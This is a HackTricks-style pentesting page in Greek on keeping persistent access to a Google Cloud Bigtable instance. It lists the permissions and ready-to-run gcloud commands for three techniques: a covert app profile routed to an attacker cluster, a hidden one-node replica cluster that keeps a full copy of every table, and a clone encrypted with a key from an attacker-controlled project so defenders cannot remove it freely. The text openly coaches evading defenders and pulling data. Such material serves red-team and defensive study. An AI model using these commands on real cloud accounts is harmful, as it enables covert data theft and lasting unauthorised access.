# GCP - Bigtable Επίμονη πρόσβαση

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Για περισσότερες πληροφορίες σχετικά με το Bigtable δείτε:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Αφιερωμένο App Profile επιτιθέμενου

**Δικαιώματα:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Δημιουργήστε ένα app profile που δρομολογεί την κίνηση στο replica cluster σας και ενεργοποιήστε το Data Boost ώστε να μην εξαρτάστε ποτέ από provisioned nodes που οι αμυνόμενοι μπορεί να παρατηρήσουν.
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
Όσο υπάρχει αυτό το προφίλ, μπορείτε να επανασυνδεθείτε χρησιμοποιώντας νέα διαπιστευτήρια που αναφέρονται σε αυτό.

### Διατηρήστε το δικό σας replica cluster

**Δικαιώματα:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Δημιουργήστε ένα cluster με ελάχιστο αριθμό κόμβων σε μια ήσυχη περιοχή. Ακόμα και αν οι ταυτότητες των client σας εξαφανιστούν, **το cluster διατηρεί ένα πλήρες αντίγραφο κάθε πίνακα** μέχρι οι αμυνόμενοι να το αφαιρέσουν ρητά.
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
Παρακολούθησέ το μέσω `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` ώστε να μπορείς να κλιμακώσεις αμέσως όταν χρειαστεί να τραβήξεις δεδομένα.

### Κλείδωσε την αναπαραγωγή πίσω από το δικό σου CMEK

**Δικαιώματα:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` on the attacker-owned key.

Χρησιμοποίησε το δικό σου KMS key όταν στήνεις ένα clone. Χωρίς αυτό το key, Google δεν μπορεί να επαναδημιουργήσει ή να κάνει fail over το cluster, οπότε οι blue teams πρέπει να συντονιστούν μαζί σου πριν το αγγίξουν.
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
Ανανεώστε ή απενεργοποιήστε το κλειδί στο έργο σας για να καταστήσετε αμέσως μη λειτουργικό το αντίγραφο (ενώ σας επιτρέπει να το ενεργοποιήσετε ξανά αργότερα).

{{#include ../../../banners/hacktricks-training.md}}
